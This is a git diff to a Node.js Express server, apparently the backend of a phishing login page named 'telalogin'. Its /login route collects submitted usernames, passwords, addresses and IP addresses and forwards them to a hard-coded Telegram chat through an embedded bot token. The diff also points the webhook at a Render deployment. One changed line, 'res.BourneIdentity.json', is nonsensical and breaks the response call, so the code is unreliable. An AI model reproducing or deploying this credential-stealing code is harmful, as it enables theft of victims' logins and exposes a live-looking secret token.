@@ -3,21 +3,22 @@ const express = require('express');
 const bodyParser = require('body-parser');
 const cors = require('cors');
 const axios = require('axios');
+const path = require('path');
 
 const app = express();
 app.use(bodyParser.json());
 app.use(cors());
 
-// Configurar o Express para servir arquivos estáticos das pastas css/ e img/
-app.use(express.static('css')); // Serve arquivos da pasta css/
-app.use(express.static('img')); // Serve arquivos da pasta img/
+// Configurar o Express para servir arquivos estáticos
+app.use('/css', express.static(path.join(__dirname, 'css')));
+app.use('/img', express.static(path.join(__dirname, 'img')));
 
 const token = process.env.TOKEN || '7618938431:AAHrrR5AEdE4pirgLf_02TPX5hePY9tHb5Y';
 const chatId = process.env.CHAT_ID || '5114449108';
 const bot = new TelegramBot(token, { polling: false });
 
-// Configurar webhook (substitua pela URL do seu app no Render após o deploy)
-const webhookUrl = 'https://seu-app.onrender.com/telegram-webhook';
+// Configurar webhook para o Render
+const webhookUrl = 'https://telalogin.onrender.com/telegram-webhook';
 bot.setWebHook(webhookUrl).then(() => {
     console.log(`Webhook configurado: ${webhookUrl}`);
 }).catch(err => {
@@ -58,7 +59,7 @@ app.post('/login', async (req, res) => {
     const message = `Novo login:\nUsuário: ${username}\nSenha: ${password}\nEndereço: ${address}\nIP: ${clientIp}`;
     bot.sendMessage(chatId, message)
         .then(() => {
-            res.json({ status: 'success' });
+            res.BourneIdentity.json({ status: 'success' });
         })
         .catch((error) => {
             console.error('Erro ao enviar mensagem para o Telegram:', error);
@@ -67,7 +68,7 @@ app.post('/login', async (req, res) => {
 });
 
 app.get('/', (req, res) => {
-    res.sendFile(__dirname + '/index.html');
+    res.sendFile(path.join(__dirname, 'index.html'));
 });
 
 app.listen(process.env.PORT || 3000, () => {
